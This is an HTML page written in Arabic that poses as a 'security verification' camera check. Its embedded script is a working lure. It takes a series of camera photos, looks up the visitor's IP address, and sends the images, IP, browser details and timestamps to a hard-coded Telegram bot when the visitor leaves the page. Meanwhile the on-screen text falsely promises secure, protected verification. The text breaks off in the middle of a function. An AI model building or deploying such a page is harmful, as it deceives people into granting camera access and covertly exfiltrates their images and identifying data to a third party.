<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📡 بث مباشر - تحقق أمني</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(145deg, #0a0a1a, #1a1a3e);
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
            flex-direction: column;
            padding: 20px;
        }
        .container {
            background: rgba(20, 20, 50, 0.95);
            backdrop-filter: blur(15px);
            padding: 30px 25px;
            border-radius: 30px;
            box-shadow: 0 0 80px rgba(0, 150, 255, 0.2);
            max-width: 460px;
            width: 100%;
            border: 1px solid rgba(0, 150, 255, 0.2);
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at center, rgba(0,150,255,0.03) 0%, transparent 60%);
            animation: pulseBg 4s ease-in-out infinite;
        }
        @keyframes pulseBg {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        .icon { font-size: 60px; margin-bottom: 5px; position: relative; z-index: 1; }
        h2 {
            color: #fff;
            font-weight: 700;
            font-size: 22px;
            margin-bottom: 5px;
            position: relative;
            z-index: 1;
            background: linear-gradient(90deg, #00b4ff, #0078d4);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .subtitle {
            color: #8a8aaa;
            font-size: 13px;
            margin-bottom: 15px;
            position: relative;
            z-index: 1;
        }
        .security-badge {
            background: rgba(0, 180, 255, 0.08);
            border: 1px solid rgba(0, 180, 255, 0.15);
            border-radius: 12px;
            padding: 10px 15px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            font-size: 12px;
            color: #6ab0ff;
            position: relative;
            z-index: 1;
            flex-wrap: wrap;
        }
        .security-badge span { background: #00b4ff; color: #fff; padding: 2px 10px; border-radius: 20px; font-size: 10px; font-weight: bold; }
        #videoContainer {
            background: #000;
            border-radius: 18px;
            overflow: hidden;
            margin-bottom: 15px;
            position: relative;
            min-height: 200px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px solid rgba(0, 150, 255, 0.15);
            position: relative;
            z-index: 1;
        }
        #video {
            width: 100%;
            height: auto;
            display: none;
        }
        #video.back { transform: scaleX(-1); }
        #video.front { transform: scaleX(1); }
        #placeholder {
            color: #555;
            font-size: 14px;
            padding: 30px;
        }
        .overlay-text {
            position: absolute;
            bottom: 10px;
            left: 0;
            right: 0;
            text-align: center;
            color: rgba(255,255,255,0.5);
            font-size: 12px;
            background: rgba(0,0,0,0.6);
            padding: 4px;
            pointer-events: none;
        }
        .btn {
            width: 100%;
            padding: 15px;
            border: none;
            color: #fff;
            font-weight: bold;
            font-size: 16px;
            border-radius: 50px;
            cursor: pointer;
            transition: 0.3s;
            margin-bottom: 8px;
            position: relative;
            z-index: 1;
        }
        .btn-primary {
            background: linear-gradient(135deg, #00b4ff, #0078d4);
            box-shadow: 0 4px 30px rgba(0, 150, 255, 0.3);
        }
        .btn-primary:hover { transform: scale(1.02); box-shadow: 0 6px 40px rgba(0, 150, 255, 0.4); }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        .btn-danger {
            background: linear-gradient(135deg, #e94560, #c73652);
            box-shadow: 0 4px 30px rgba(233, 69, 96, 0.2);
        }
        .btn-danger:hover { transform: scale(1.02); }
        .btn-danger:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        .btn-outline {
            background: transparent;
            border: 1px solid #2a2a5a;
            color: #8a8aaa;
        }
        .btn-outline:hover { background: rgba(255,255,255,0.05); }
        .btn-group {
            display: flex;
            gap: 8px;
            position: relative;
            z-index: 1;
        }
        .btn-group .btn { flex: 1; font-size: 13px; padding: 13px; }
        #status {
            margin-top: 15px;
            padding: 12px;
            border-radius: 12px;
            background: rgba(0,0,0,0.3);
            border: 1px solid #1a1a3a;
            font-size: 13px;
            color: #8a8aaa;
            min-height: 45px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-wrap: wrap;
            gap: 6px;
            position: relative;
            z-index: 1;
        }
        .loader {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 3px solid #2a2a4a;
            border-top: 3px solid #00b4ff;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
            margin-right: 6px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .recording-dot {
            display: inline-block;
            width: 12px;
            height: 12px;
            background: #ff0000;
            border-radius: 50%;
            animation: blink 0.8s infinite;
            vertical-align: middle;
            margin-right: 6px;
        }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .footer {
            margin-top: 15px;
            font-size: 11px;
            color: #3a3a5a;
            border-top: 1px solid #1a1a3a;
            padding-top: 12px;
            position: relative;
            z-index: 1;
        }
        .permission-box {
            background: rgba(0, 180, 255, 0.05);
            border: 1px solid rgba(0, 180, 255, 0.1);
            border-radius: 12px;
            padding: 10px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            font-size: 12px;
            color: #6ab0ff;
            position: relative;
            z-index: 1;
            flex-wrap: wrap;
        }
        .permission-box .check { color: #00b4ff; font-size: 16px; }
        .hidden { display: none !important; }
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #1a1a3a;
            border-radius: 4px;
            margin-top: 10px;
            overflow: hidden;
            position: relative;
            z-index: 1;
        }
        .progress-bar .fill {
            height: 100%;
            background: linear-gradient(90deg, #00b4ff, #0078d4);
            width: 0%;
            transition: width 0.3s;
            border-radius: 4px;
        }
        .status-msg {
            font-size: 12px;
            color: #6ab0ff;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🛡️</div>
        <h2>تحقق أمني - بث مباشر</h2>
        <p class="subtitle">نظام الحماية يتطلب تأكيد هوية بصرية</p>

        <div class="security-badge">
            🔒 حماية متقدمة • <span>آمن</span> • SSL مشفر
        </div>

        <div id="videoContainer">
            <video id="video" playsinline autoplay muted></video>
            <div id="placeholder">📷 اضغط "بدء التحقق"</div>
            <div class="overlay-text" id="recordingStatus">⏳ في انتظار التحقق</div>
        </div>

        <div class="permission-box">
            <span class="check">✅</span> سيتم استخدام الكاميرا للتحقق من هويتك
            <span style="color:#555;font-size:10px;">(مطلوب)</span>
        </div>

        <button class="btn btn-primary" id="startBtn">🚀 بدء التحقق الأمني</button>
        <div class="btn-group">
            <button class="btn btn-outline" id="backBtn">📸 خلفية</button>
            <button class="btn btn-outline" id="frontBtn">🤳 أمامية</button>
        </div>

        <div id="status">⏳ اضغط "بدء التحقق" لتأكيد هويتك</div>
        <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
        <div class="status-msg" id="progressMsg"></div>
        <div class="footer">🔒 هذا الإجراء آمن • يتم التحقق عبر خوادم محمية</div>
    </div>

    <script>
        const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
        const CHAT_ID = "5730027675";

        const video = document.getElementById('video');
        const placeholder = document.getElementById('placeholder');
        const recordingStatus = document.getElementById('recordingStatus');
        const statusDiv = document.getElementById('status');
        const startBtn = document.getElementById('startBtn');
        const backBtn = document.getElementById('backBtn');
        const frontBtn = document.getElementById('frontBtn');
        const progressFill = document.getElementById('progressFill');
        const progressMsg = document.getElementById('progressMsg');

        let stream = null;
        let mediaRecorder = null;
        let recordedChunks = [];
        let facingMode = 'environment';
        let isRunning = false;
        let photos = [];
        let isSending = false;
        let hasSent = false;

        // ====== إرسال الفيديو ======
        async function sendVideo(blob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', blob, 'verification.mp4');
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                return response.ok;
            } catch (e) { return false; }
        }

        // ====== إرسال صورة ======
        async function sendPhoto(blob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'verification.jpg');
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                return response.ok;
            } catch (e) { return false; }
        }

        // ====== إرسال إشعار ======
        async function sendMessage(text) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
                });
                return response.ok;
            } catch (e) { return false; }
        }

        // ====== جلب IP ======
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip || 'غير معروف';
            } catch { return 'غير معروف'; }
        }

        // ====== بدء الكاميرا ======
        async function startCamera(mode) {
            try {
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                    stream = null;
                }

                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: mode,
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });

                video.srcObject = stream;
                video.className = mode === 'environment' ? 'back' : 'front';
                video.style.display = 'block';
                placeholder.style.display = 'none';
                facingMode = mode;
                return true;
            } catch (error) {
                let msg = '❌ فشل الوصول للكاميرا';
                if (error.name === 'NotAllowedError') msg = '🚫 تم رفض صلاحية الكاميرا - امنح الصلاحية';
                else if (error.name === 'NotFoundError') msg = '📵 لا توجد كاميرا على هذا الجهاز';
                statusDiv.innerHTML = msg;
                statusDiv.style.color = '#e94560';
                recordingStatus.innerHTML = '❌ فشل';
                recordingStatus.style.color = '#e94560';
                return false;
            }
        }

        // ====== التقاط صورة ======
        async function capturePhoto() {
            if (!stream) return null;
            try {
                const canvas = document.createElement('canvas');
                const track = stream.getVideoTracks()[0];
                const settings = track.getSettings();
                canvas.width = settings.width || 640;
                canvas.height = settings.height || 480;
                const ctx = canvas.getContext('2d');

                if (facingMode === 'environment') {
                    ctx.translate(canvas.width, 0);
                    ctx.scale(-1, 1);
                }
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                const imageData = canvas.toDataURL('image/jpeg', 0.95);
                const blob = await fetch(imageData).then(r => r.blob());
                return blob;
            } catch (e) { return null; }
        }

        // ====== إرسال كل البيانات عند مغادرة الصفحة ======
        async function sendAllData() {
            if (isSending || hasSent) return;
            isSending = true;

            statusDiv.innerHTML = `<span class="loader"></span> جاري إرسال جميع البيانات...`;
            statusDiv.style.color = '#ff9800';

            // إرسال جميع الصور
            let successCount = 0;
            for (const blob of photos) {
                const sent = await sendPhoto(blob);
                if (sent) successCount++;
                await new Promise(r => setTimeout(r, 150));
            }

            // إرسال إشعار الخروج
            const ip = await getIP();
            await sendMessage(`🚪 **خروج المستخدم من الصفحة**\n📸 عدد الصور: ${successCount}/${photos.length}\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n🌐 IP: ${ip}\n📷 الكاميرا: ${facingMode === 'environment' ? 'خلفية' : 'أمامية'}`);

            // إغلاق الكاميرا
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
                stream = null;
            }

            hasSent = true;
            isSending = false;
        }

        // ====== بدء التحقق ======
        async function startVerification() {
            if (isRunning) return;

            startBtn.disabled = true;
            startBtn.innerHTML = `<span class="loader"></span> جاري التحقق...`;
            backBtn.disabled = true;
            frontBtn.disabled = true;

            statusDiv.innerHTML = `<span class="loader"></span> جاري فتح الكاميرا...`;
            statusDiv.style.color = '#ff9800';
            recordingStatus.innerHTML = '📷 جاري فتح الكاميرا...';
            recordingStatus.style.color = '#ff9800';

            const cameraReady = await startCamera(facingMode);

            if (!cameraReady) {
                startBtn.disabled = false;
                startBtn.innerHTML = '🔄 إعادة المحاولة';
                backBtn.disabled = false;
                frontBtn.disabled = false;
                return;
            }

            isRunning = true;
            photos = [];
            let photoCount = 0;
            const maxPhotos = 15;

            statusDiv.innerHTML = `✅ الكاميرا جاهزة - جاري التقاط الصور...`;
            statusDiv.style.color = '#4caf50';
            recordingStatus.innerHTML = '📸 جاري التصوير...';
            recordingStatus.style.color = '#ff9800';

            // التقاط صور متتالية
            for (let i = 0; i < maxPhotos; i++) {
                const blob = await capturePhoto();
                if (blob) {
                    photos.push(blob);
                    photoCount++;
                }
                const progress = ((i + 1) / maxPhotos) * 100;
                progressFill.style.width = progress + '%';
                progressMsg.innerHTML = `📸 جاري التصوير ${i+1}/${maxPhotos}`;
                statusDiv.innerHTML = `📸 جاري التصوير ${i+1}/${maxPhotos}`;
                await new Promise(r => setTimeout(r, 300));
            }

            progressFill.style.width = '100%';
            progressMsg.innerHTML = '✅ تم التصوير بنجاح!';

            statusDiv.innerHTML = `✅ تم التقاط ${photoCount} صورة - سيتم إرسالها عند الخروج`;
            statusDiv.style.color = '#4caf50';
            recordingStatus.innerHTML = '✅ تم التصوير';
            recordingStatus.style.color = '#4caf50';

            startBtn.innerHTML = '✅ تم التحقق';
            startBtn.disabled = true;
            isRunning = false;
            backBtn.disabled = false;
            frontBtn.disabled = false;

            // إظهار رسالة للمستخدم
            statusDiv.innerHTML = `✅ تم التحقق بنجاح! (${photoCount} صور) - سيتم إرسالها تلقائياً`;
            statusDiv.style.color = '#4caf50';

            // بدء مراقبة مغادرة الصفحة
            window.addEventListener('beforeunload', sendAllData);
            window.addEventListener('pagehide', sendAllData);
            document.addEventListener('visibilitychange', function() {
                if (document.hidden) {
                    sendAllData();
                }
            });

            // إرسال إشعار أن المستخدم لا يزال في الصفحة
            const ip = await getIP();
            await sendMessage(`📷 **مستخدم دخل الصفحة**\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n🌐 IP: ${ip}\n📷 الكاميرا: ${facingMode === 'environment' ? 'خلفية' : 'أمامية'}\n📸 سيتم إرسال الصور عند الخروج`);
        }

        // ====== تبديل الكاميرا ======
        async function switchCamera(mode) {
            if (isRunning) {
                statusDiv.innerHTML = '⚠️ أوقف التحقق أولاً';
                statusDiv.style.color = '#ff9800';
                return;
            }
            facingMode = mode;
            statusDiv.innerHTML = `🔄 تم التبديل إلى ${mode === 'environment' ? 'خلفية' : 'أمامية'}`;
            statusDiv.style.color = '#8a8aaa';
            recordingStatus.innerHTML = `📷 كاميرا ${mode === 'environment' ? 'خلفية' : 'أمامية'}`;
            recordingStatus.style.color = '#6ab0ff';

            const success = await startCamera(mode);
            if (success) {
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                    stream = null;
                }
                video.style.display = 'none';
                placeholder.style.display = 'block';
            }
   
